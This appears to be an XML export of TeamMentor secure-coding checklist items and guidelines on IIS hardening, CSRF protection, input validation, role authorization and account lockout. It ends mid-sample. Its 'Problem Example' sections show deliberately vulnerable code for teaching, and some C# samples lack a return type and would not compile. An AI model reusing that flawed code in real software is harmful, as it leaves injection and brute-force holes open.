<?xml version="1.0"?>
<ArrayOfTeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="530243143" Content_Hash="272209532">
    <Metadata>
      <Id>ef0a7a3d-5739-47d8-9e46-0c733e158311</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Resource kit tools, utilities, and SDKs are removed.</Title>
      <Category>Server Hardening</Category>
      <Phase>Deployment</Phase>
      <Technology> Any</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Check For</h1><p>Check to ensure that resource kit tools, utilities, and SDKs are removed from the Web Server if they are installed.</p><br><h1>How to Fix</h1><p>SDKs and resource kits should not be installed on a production Web server. Remove them if they are present. </p><ul><li>Ensure that only the .NET Framework Redistributable package is installed on the server and no SDK utilities are installed. Do not install Visual Studio&nbsp;.NET on production servers. </li><li>Ensure that access to powerful system tools and utilities, such as those contained in the \Program Files directory, is restricted. IISLockdown does this for you. </li><li>Debugging tools should not be available on the Web server. If production debugging is necessary, then you should create a CD that contains the necessary debugging tools. </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-648249035" Content_Hash="-964620101">
    <Metadata>
      <Id>f0471b48-901f-46d9-acf7-c15500392a83</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Unnecessary or unused ISAPI filters are removed from the server.</Title>
      <Category>Server Hardening</Category>
      <Phase>Deployment</Phase>
      <Technology> Any</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Author>
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Check For</h1><p>Check to ensure that unnecessary or unused ISAPI filters are removed from the server.</p><br><h1>How to Fix</h1><p>In the past, vulnerabilities in ISAPI filters caused significant IIS exploitation. There are no unneeded ISAPI filters after a clean IIS installation, although the .NET Framework installs the ASP.NET ISAPI filter (Aspnet_filter.dll), which is loaded into the IIS process address space (Inetinfo.exe) and is used to support cookie-less session state management.</p><p>If your applications do not need to support cookie-less session state and they do not set the <strong>cookieless</strong> attribute to <strong>true</strong> on the <strong>&lt;sessionState&gt; </strong>element, this filter can be removed.</p><p>During this step, you remove unused ISAPI filters.</p><h3>Remove Unused ISAPI Filters</h3><p>Remove any unused ISAPI filters as explained in the following section.</p><p><strong>To view ISAPI filters</strong> </p><ol><li>To start IIS, select <strong>Internet Services Manager</strong> from the Administrative Tools programs group. </li><li>Right-click the machine (not Web site, because filters are machine wide), and then click <strong>Properties</strong>. </li><li>Click <strong>Edit</strong>. </li><li>Click the <strong>ISAPI Filters</strong> tab. <p>The tabbed page is shown below: </p><p><img src="http://msdn2.microsoft.com/en-us/library/Aa302432.f16thcm05(en-us,MSDN.10).gif" style="border:1px solid #000"> </p><p>&nbsp;</p></li></ol><p><strong><em>Removing unused ISAPI filters</em></strong></p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="346138401" Content_Hash="810176508">
    <Metadata>
      <Id>f362b5ea-cb80-412f-a9da-da17ff28de75</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Unused protocols are blocked by default.</Title>
      <Category>Server Hardening</Category>
      <Phase>Deployment</Phase>
      <Technology> Any</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Check For</h1><p>Check to ensure that unused protocols are blocked by default when configuring your network firewall.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-696592553" Content_Hash="402406132">
    <Metadata>
      <Id>f4316f36-b9cf-42ee-86eb-eba99abd9add</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Unused HttpModules are removed.</Title>
      <Category>Server Hardening</Category>
      <Phase>Deployment</Phase>
      <Technology> Any</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Check For</h1><p>Check to ensure that unused HttpModules are removed in the machine.config file.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1185517997" Content_Hash="-18548869">
    <Metadata>
      <Id>f527a834-7f1b-41dd-9383-d386de47b9da</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Page ViewStateUserKey is used to Counter One-click Attacks</Title>
      <Category>Parameter Manipulation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Check For</h1><p>Check to ensure that all forms that require authentication or can be used to trigger important functionality are protected with ViewStateUserKey.</p><h1>Why</h1><p>A one-click attack consists of posting a malicious HTTP form to a known, vulnerable Web site. It is called "one-click" because it usually begins with an unaware victim clicking on an alluring link received through e-mail or found when navigating a crowded forum.&nbsp; By following the link, the user inadvertently triggers a remote process that ends up submitting the malicious form to a site.&nbsp; This allows an attacker to perform any action caused by the vulnerable form with the credentials of the victim.</p><p><strong>ViewStateUserKey</strong> makes it much harder for hackers to use the content of the client-side view state to prepare malicious posts against the site.&nbsp; Each time a form is invoked, a unique key is generated.&nbsp; The key contains encrypted time and session information, and the form submission is rejected if it is used in another session or after the session timeout has expired. </p><h1>How to Check</h1><p>Use the following steps to check whether ViewStateUserKey is used properly:</p><ol><li><p><strong>Identify pages that should be protected. </strong>Review your application and make a list of all the forms that should be protected with ViewStateUserKey.&nbsp; Forms that meet either of the following criteria should be protected:</p><ul><li>The form requires authentication </li><li>The form triggers important application behavior or a write operation to a persistent store (eg. SQL database)</li></ul></li><li><p><strong>Check to see if the pages are protected. </strong>ViewStateUserKey can be set per page or in the <strong>OnInit</strong> virtual method of the page-derived class.&nbsp; </p><ol><li>First check <strong>OnInit</strong>, if you find protection there, then all of your pages are covered.<br><br><pre>protected override OnInit(EventArgs e) {<br>&nbsp;&nbsp; base.OnInit(e); <br>&nbsp;&nbsp; ViewStateUserKey = Session.SessionID;<br>}</pre></li><li>Next check the individual pages, for instance:<br><br><pre>void Page_Init (object sender, EventArgs e) {<br>&nbsp;&nbsp; ViewStateUserKey = Session.SessionID;<br>}</pre></li></ol></li><li><p><strong>Ensure ViewStateUserKey is set properly. </strong>Setting <strong>ViewStateUserKey</strong> to a constant string—the same for all users—is like leaving it blank.&nbsp; It must be set to something that varies for each user—such as user ID or, better yet, session ID.&nbsp; For a number of technical and social reasons, session ID is a much better fit because a session ID is unpredictable, times out, and varies on a per-user basis. </p></li></ol><h1>How to Fix</h1><p>The&nbsp;following code added to each&nbsp;of your pages will set the key based on SessionID.</p><pre>void Page_Init (object sender, EventArgs e) {<br>   ViewStateUserKey = Session.SessionID;<br>}</pre><p>Alternatively, you can add this code to the <strong>OnInit</strong> virtual method of the <strong>Page</strong>-derived class.&nbsp; (Note that you must set this property in the <strong>Page.Init</strong> event).&nbsp; This will allow you to write the code once rather than per page.</p><pre>protected override OnInit(EventArgs e) {<br>   base.OnInit(e); <br>   ViewStateUserKey = Session.SessionID;<br>}</pre><h1>Related Items</h1><ul><li><a href="ruledisplay:aa797ec2-627d-4b17-8c17-5a8405415344">Use Page ViewState User Key to Counter One-Click Attacks</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1543158672" Content_Hash="-1309247098">
    <Metadata>
      <Id>f5550797-e7b2-43e6-8f8d-6513e02d54e8</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Application Does Not Rely Only on Client-Side Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<br><br><h1>What to Check For</h1><p>Ensure that all input validation is performed on the server. Client-side validation should only be used for performance and usability reasons. </p><h1>Why</h1><p>Client-side validation is executed by the client and can be easily bypassed. Client side validation is a major design problem when it appears in web applications. It places trust in the browser, an entity that should never be trusted.</p><h1>How to Check</h1><p>An application can take input via various ways such as a web interface, database, file system or other software running on the server. Use the following steps to establish a validation strategy:</p><ol><li><p><strong>Identify all sources of input. </strong>During design time, identify all of the potential input sources to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list that you can use in the following steps. The most common sources are: </p><ul><li>URL based parameters </li><li>Form based parameters </li><li>Hidden fields </li><li>Cookies </li><li>HTTP headers (Host, accept types, www authentication, cache settings, encodings, etc) </li><li>Local filesystem </li><li>Database </li><li>Other services running on the system </li><li>Javascript variables </li><li>File upload and attributes (filename, size, data, etc) </li><li>DNS results or host names </li><li>External component call return values (COM, AJAX, ActiveX) </li></ul></li><li><p><strong>Identify validation routines. </strong>Each input source should have a server side validation routine associated with it. Ideally the validation will occur as soon as the input reaches your application. Shared validation routines are better than creating many throughout the code base and may be located in a single component.</p><p>Validation may be identified by any of the following:</p><ul><li>Custom Java Validator class </li><li>Regular expression use (<strong>java.util.regex</strong>) </li><li>Method names that contain <strong>validate</strong> or <strong>validator</strong> </li><li>Client-side validation is often linked to events: <ul><li>onSubmit </li><li>onChange </li><li>onFocus </li><li>onBlur </li><li>onKeyDown/Press/Up</li></ul></li></ul></li><li><p><strong>Ensure validators run on the server. </strong>At a minimum, validation routines should run on the server. Server-side validation guarantees that malformed input will be caught and discarded regardless of the state that the client is in. As an optional feature, validation can also be implemented client side in order to improve application performance and user experience.<br><br>Server-side validation is done within the application code and ideally the validation will occur as soon as the input reaches your application. In web applications, look for application-supplied validators, such as a Custom Java Validator, to validate and constrain input after it is received from an input source, such as a <strong>GET</strong> parameter. Check for the use of regular expressions and <strong>java.util.regex</strong>, or the use of a validator that checks numeric ranges.</p>Client-side Example: <blockquote><pre>//The validation function is defined in JavaScript in the client-side form<br>&lt;script language="JavaScript"&gt; function validate()<br>{<br> ...<br>}<br>&lt;/script&gt;<br>...<br>// The application uses validation in the client-side form to validate the input<br>&lt;form method="post"<br> action="/myapp/aggregate"<br> onsubmit="return validate()"&gt;</pre></blockquote><p>Server-side Example:</p><blockquote><pre>//The input "searchTerm" is received from a request<br>String searchTerm = request.getParameter("index");<br>...<br>// The application uses validation in the application code to validate the input<br>if (validateSearchTerm(searchTerm))<br>{<br>      ...<br>}</pre></blockquote></li></ol><h1>Problem Example</h1><p>The following code produces a data analysis based on a financial index. Unfortunately, the user's input is validated only on the client side via a JavaScript routine. Since there is no validation on the server, an attacker can bypass all validation and exploit cross-site scripting and SQL injection vulnerabilities.</p><blockquote><pre>&lt;!-- Filename: idv01.html --&gt;<br>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;!-- The page uses client-side validation only --&gt;<br>    &lt;script language="JavaScript"&gt;<br>&lt;!--function validate()<br>{<br>   var idx = document.forms[0].elements[0].value;<br>   var regex = new RegExp("[a-zA-Z0-9]+");<br>   var match = regex.exec(idx);<br>   var ret = false;<br>   if(idx.length &lt; 9 &amp;&amp; match != null)<br>   {<br>      ret = true;<br>   }<br>   else<br>   {<br>      alert("Invalid index!");<br>   }<br>    return ret;<br>}<br>// --&gt;<br>    &lt;/script&gt;<br>    &lt;title&gt;Query for index&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;!-- The application relies on client-side validation --&gt;<br>    &lt;form method="post" action="/myapp/aggregate" onsubmit="return validate()"&gt;<br>      index:&amp;nbsp;&lt;input name="index" type="text" size="10"&gt;<br>                  &lt;input name="submit" value="query" type="submit"&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br>//<br>Filename: /myapp/aggregateimport java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br>public final class DataAggregator extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  String retString;<br>                  retString = "The queried index \"";<br>                  retString += encodeHtml(searchTerm);<br>                  retString += "\" produced the following results:&lt;br&gt; ";<br>                  out.println(retString);<br>                  // The application does not provide a server-side validation<br>                  aggregateData(out, searchTerm);<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                  // mechanisms. Consult the Exception Handling and<br>                  // Logging sections<br>                  out.println("We cannot handle your request at the moment."<br>                           + " Please try again later.");<br>            }<br>             out.flush();<br>             out.close();<br>      }<br>}</pre></blockquote><h1>Related Guideline</h1><ul><li><a href="ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93">Guideline: Do Not Rely on Client-Side Validation (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1211791601" Content_Hash="-193147458">
    <Metadata>
      <Id>fb83e483-3a9b-424c-8288-a66900d3a738</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Application Does Not Rely Only on Request Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Check For</h1><p>Ensure that your application does not rely solely upon ASP.NET request validation to protect against malicious input.</p><h1>Why</h1><p>Request validation will catch some attacks; however, it provides only basic input validation. Do not rely on it. Use it as an extra precautionary measure in addition to your own input validation. Only you can define what represents good input for your application. </p><h1>How to Check</h1><p>To check for this problem, you must determine if your application is relying solely upon request validation to provide input and data validation. Use the following steps:&nbsp;</p><ol><li><p><strong>Find all sources of input in your application.</strong> During design time identify all of the potential sources of input to your application. Scour the source code to discover sources of input that may have been missed in the design. Compile a list that you can use in the following steps. </p></li><li><p><strong>Identify validation routines.</strong> Each input source should have a data validation routine associated with it.&nbsp;Ideally the validation will occur as soon after the input reaches your application as possible. Shared validation routines are better than creating many spread throughout your code base, so check for consolidation of routines to aid testing and reduce the chance of one-off bugs. If an input source does not have a validation routine associated with it, flag it for fixing.</p><br></li><li><p><strong>Ensure quality of validation routines.</strong> Validation routines&nbsp;should check for length, range, format, and type. Validation should check first&nbsp;for known valid and safe data and then for malicious, dangerous data. Do not rely on filtering out all malicious data because&nbsp;it is too easy to miss something. Do not rely on client-side validation alone as it can be easily bypassed.</p><br></li></ol><h1>How to Fix</h1><p>Check for known good data and constrain input by validating it for type, length, format, and range.&nbsp;For more information on protecting against injection attacks through property input validation, see <a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000003.asp">How To: Protect From Injection Attacks in ASP.NET</a>.&nbsp; For more information on input validation using regular expressions, see <a href="http://msdn.microsoft.com/library/en-us/dnpag2/html/PAGHT000001.asp">How To: Use Regular Expressions to Constrain Input in ASP.NET</a>.</p><p><strong>Note</strong>: Validating input does not remove the need to format output, parameterize queries, or otherwise handle user input carefully.</p><h1>Problem Example</h1><p>An ASP.NET application uses forms authentication; however, it relies upon request validation to validate the form of the username and password entered by the user.&nbsp;The application does not contain any validation routines to check input for length, range, format and type.</p><h1>Solution Example</h1><p>An ASP.NET application uses forms authentication and has a variety of other input fields for user interaction.&nbsp; Request validation has been left on as a precautionary measure; however, it is not the sole defense mechanism against malicious input. The application authors have included validation routines through which all untrusted input and data is passed before it is used by the application.</p><h1>Related Items</h1><ul><li><div><a href="ruledisplay:5f6a8e60-f809-4038-a725-c5019f1dc993">Guideline: Validate Input from All Sources</a></div></li><li><div><a href="ruledisplay:417133af-0ab8-4ad5-9aea-a59b08abf022">Checklist Item: All Input is Validated For Length, Range, Format, and Type</a></div></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="2033285036" Content_Hash="-1385664248">
    <Metadata>
      <Id>fe3f09f3-6718-48ed-afc1-717959c86a58</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Untrusted Input Passed to Data Access Methods is Validated</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Check For</h1><p>Check to ensure that your application validates untrusted input that is&nbsp;passed to data access methods.</p><h1>How to Fix</h1><p>If your data access methods receive input parameters from outside the trust boundary of your data access code, make sure you validate them for type, length, format, and range. You can use regular expressions for text input and perform type and range checks on numeric data. If you do not do this, your data access code is potentially susceptible to SQL injection. </p><p>Only omit input parameter validation in your data access methods if you know for certain that data can only be supplied by trusted code, such as your application's business logic, which you know has thoroughly validated the data passed to it.</p><blockquote><strong>Note</strong>&nbsp;&nbsp;&nbsp;Avoid storing encoded data; instead, encode the data as close as possible to the output.</blockquote><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1978889832" Content_Hash="-488176236">
    <Metadata>
      <Id>ff63f731-227d-4ef9-bb72-9c59fea7664b</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Role Manager is used for Roles Authorization Rather than Custom Code</Title>
      <Category>Authorization</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Check For</h1><p>Ensure that&nbsp;the ASP.NET Role Manager is used for role-based authorization&nbsp;rather than&nbsp;custom code.</p><h1>Why</h1><p>ASP.NET provides a role manager feature that automatically creates, manages and looks up roles for the authenticated user. Role managers reduce the possibilities&nbsp;of serious security issues from programmer errors&nbsp;as well as&nbsp;reduce the amount of custom code needed for an application. </p><h1>How to Check</h1><p>Use the following steps to check if your application is using the Role Manager:</p><ol><li>Check for the existence of the &lt;<strong>roleManager</strong>&gt; element beneath the &lt;<strong>system.web</strong>&gt; section of your application's Web.config file and make sure the <strong>enabled</strong> attribute is set to <strong>true.</strong> </li><li>Ensure there is a connection string in the &lt;<strong>connectionStrings</strong>&gt; section that points to your roles store. </li><li>Ensure there is a specific provider configured in the &lt;<strong>roleManager</strong>&gt;<strong> </strong>element. </li><li>Check that the <strong>defaultProvider</strong> attribute on the &lt;<strong>roleManager</strong>&gt; element points to your chosen role provider. </li><li>Check your application's code and ensure it is using the Role Manager API (for example <strong>Roles.IsUserInRole </strong>and <strong>Roles.CreateRole</strong>) whenever a roles check takes place.</li></ol><h1>How to Fix</h1><ol><li>User authentication access checks </li><li>Role access from the configured role store by the <strong>RoleManager</strong> HTTP module using the configured role provider </li><li>URL and file authorization </li><li>Programmatic role checks</li></ol><p>This order means that role information cannot be used for an unauthenticated user. It also means that role access can be used for URL and file authorization.</p><p>To use the role manager feature in an ASP.NET application, you need to do the following: </p><ol><li>Add a &lt;<strong>roleManager</strong>&gt; element beneath the &lt;<strong>system.web</strong>&gt; section of your application's Web.config file and enable role manager by setting its <strong>enabled</strong> attribute to <strong>true</strong>. </li><li>Add a connection string to the &lt;<strong>connectionStrings</strong>&gt; section to point to your roles store. If you are using the <strong>AuthorizationStoreRoleProvider</strong>, this is an LDAP query string pointing to your Authorization Manager Policy store in Active Directory or ADAM. If you are using the <strong>SqlRoleProvider</strong>, this is a database connection string that points to your role store database. </li><li>Configure the specific provider in the &lt;<strong>roleManager</strong>&gt;<strong> </strong>element in your application's Web.config file. The role manager system supports the following providers: </li><li>If your application roles are in an Authorization Manager Policy store in Active Directory or ADAM, use the <strong>AuthorizationStoreRoleProvider</strong>. </li><li>If your application roles are in a SQL Server database, use the <strong>SqlRoleProvider.</strong> </li><li>If your application uses Windows groups as roles, use the <strong>WindowsTokenRoleProvider</strong>. Note that this is recommended to be used with Windows Authentication only. </li><li>If your application roles are in a store other than those previously listed, create a custom roles provider inheriting <strong>RoleProvider</strong> base class. </li><li>Set the <strong>defaultProvider</strong> attribute on the &lt;<strong>roleManager</strong>&gt; element to the chosen role provider. </li></ol><p>To check roles and manage roles, use the Role Manager API (for example <strong>Roles.IsUserInRole </strong>and <strong>Roles.CreateRole</strong>). </p><h1>Related Items</h1><ul><li><a href="ruledisplay:86e905f3-25a9-438c-bdc6-5b242584be2a">Use ASP.NET Role Manager for Roles Authorization</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1203409825" Content_Hash="-997746395">
    <Metadata>
      <Id>00c5fcad-6dc3-4362-bfa3-a55379abe094</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate All Values Sent from the Client</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Do</h1><p>Check that your application validates all input parameters, including regular and hidden form fields, query strings, and cookies.</p><h1>Why</h1><p>To protect your application from denial of service attacks and code injection attacks, including SQL injection and XSS.</p><h1>When</h1><p>This is an important guideline and should be followed all the time.&nbsp;</p><h1>How</h1><p>Restrict the fields that the user can enter and modify and validate all values coming from the client. If you have predefined values in your form fields, users can change them and post them back to receive different results. Permit only known good values wherever possible. For example, if the input field is for a state, only inputs matching a state postal code should be permitted.</p><p>The <strong>System.Text.RegularExpressions.Regex</strong> class helps validate input parameters. For example, the following code shows how to use this class to validate a name passed through a query string parameter. The same technique can be used to validate other forms of input parameter, for example, from cookies or form fields. For example, to validate a cookie parameter, use <strong>Request.Cookies</strong> instead of <strong>Request.QueryString</strong>.</p><div><div></div><div><pre>using System.Text.RegularExpressions;<br>. . .<br>private void Page_Load(object sender, System.EventArgs e)<br>{<br>&nbsp; // Name must contain between 1 and 40 alphanumeric characters<br>&nbsp; // together with (optionally) special characters '`´ for names such<br>&nbsp; // as D'Angelo<br>&nbsp; if (!Regex.IsMatch(Request.QueryString["name"], <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @"^[a-zA-Z'`-´\s]{1,40}$"))<br>&nbsp;&nbsp;&nbsp; throw new Exception("Invalid name parameter");<br>&nbsp; // Use individual regular expressions to validate all other<br>&nbsp; // query string parameters<br>&nbsp; . . .<br>}<br></pre></div></div><p>For more information about using regular expressions and how to validate input data, see "<a href="http://msdn2.microsoft.com/en-us/library/aa302426.aspx#c10618429_006">Input Validation</a>".</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-539372229" Content_Hash="1554891582">
    <Metadata>
      <Id>04f887c2-3d04-4e9b-99e2-74b18bbd6f2b</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Lock Accounts After Consecutive Failed Login Attempts</Title>
      <Category>Authentication</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Lock users' accounts after consecutive failed login attempts.</p><h1>Why</h1><p>Multiple consecutive failed authentication attempts over a short period of time are a symptom that is used to detect when an account is under attack. Locking out the account can prevent&nbsp;an attacker from compromising and accessing the account.</p><h1>When</h1><p>Your application should lock an account if the user has unsuccessfully tried to authenticate multiple times within a small period of time.</p><h1>How</h1><p>Use the following steps to successfully lock accounts after consecutive failed login attempts:</p><ol><li><p><strong>Determine a lockout policy. </strong>There are two variables to consider when determining a lockout policy:</p><ul><li>Number of allowed consecutive failed login attempts </li><li>Amount of time that a locked account will remain locked</li></ul><p>A simple policy would be to lock an account after&nbsp;five failed login attempts for the duration of 15 minutes. Although this is an effective method for blocking a brute force attack, it exposes your application to denial of service as an attacker can easily keep an account locked through a small stream of authentication requests.<br><br>When determining the lockout policy, it is important to evaluate the risk of attacks against the user and the support costs associated with reactivating a locked account. For example, requiring the user to contact your organization's support staff&nbsp;to reactivate a locked account will have a direct impact on support costs and would add general user frustration.&nbsp;However, it is important to use extra care when designing more sophisticated variations of your application's lockout policy, such as correlating a single or multiple user login attempts with a source IP. When adding extra levels of complexity, carefully consider and evaluate the scenarios where your application's lockout policy can be circumvented or can harm your business. For instance, consider scenarios where an attacker would attempt to compromise a user through the use of multiple hosts, or multiple users would authenticate using a shared office IP.</p></li><li><p><strong>Track login attempts. </strong>Login attempts can be tracked with the use of a login counter. Increment the counter once a user tries to authenticate. Reset the counter to 0 after the user successfully authenticates. Example:</p><blockquote><pre>-- Authenticate the user<br>sql&gt; select login_attempts from users<br>      where user = {{username}} and pass = {{passDigest}};<br> -- Reset the login counter<br>sql&gt; update users set login_attempts = 0 where user = {{username}};</pre></blockquote></li><li><p><strong>Enforce the lockout policy. </strong>The lockout policy should be enforced at all points in the application where authentication is necessary. Example:</p><blockquote><pre>String dbStatement = "select login_attempts from users"<br>                   + "where user = ? and pass = ?;";<br>PreparedStatement st = dbConnection.prepareStatement(dbStatement);<br>st.setString(1, user);st.setString(2, passDigest);<br>ResultSet rs = st.executeQuery();<br> if (rs.first())<br>{      <br>userIsValid = true;<br>      loginCount = rs.getInt(1);<br>}<br>else<br>{<br>      userIsValid = false;<br>}<br> rs.close(); if(userIsValid)<br>{<br>      if(loginCount &gt; 3)<br>      {<br>            throw new AccountIsLockedException();<br>      }<br>       resetLoginAttemptCounter(user);<br>       // The application checks the password's maturity<br>      checkPasswordMaturity(user);<br>}<br>else<br>{<br>      updateLastLoginAttempt(user);<br>}</pre></blockquote></li><li><p><strong>Set an unlocking mechanism. </strong>Keep track of the lockout period. Based on your application's lockout policy, unlock the account after the lockout period has expired. Example:</p><blockquote><pre>-- Unlock all locked accounts whose 45 minute lockout period has expired<br>sql&gt; update users set login_attempts = 0<br>      where last_login &lt; (current_timestamp - interval '45' minute);</pre></blockquote></li></ol><p><strong>Note:</strong> PCI DSS requirements state that an account should be locked out for at least 30 minutes after no more than six failed login attempts.</p><h1>Problem Example</h1><p>The following code executes the database transaction that is required during authentication. Because the transaction fails to check the login attempts counter, it is possible for an attacker to compromise an account through the use of brute force or a dictionary attack.</p><blockquote><pre>// The application fails to check the number of login attempts<br>String dbStatement = "select user from users where user = ? and pass = ?;";<br>st = dbConnection.prepareStatement(dbStatement);<br>st.setString(1, user);st.setString(2, passDigest);<br>rs = st.executeQuery();</pre></blockquote><h1>Solution Example</h1><p>The following code executes the database transaction that is required during authentication. Because the transaction checks the login attempts counter, it would be very expensive for an attacker to compromise an account through the use of brute force or a dictionary attack.</p><blockquote><pre>// The application checks the number of login attempts<br>String dbStatement = "select login_attempts from users where user = ? and pass = 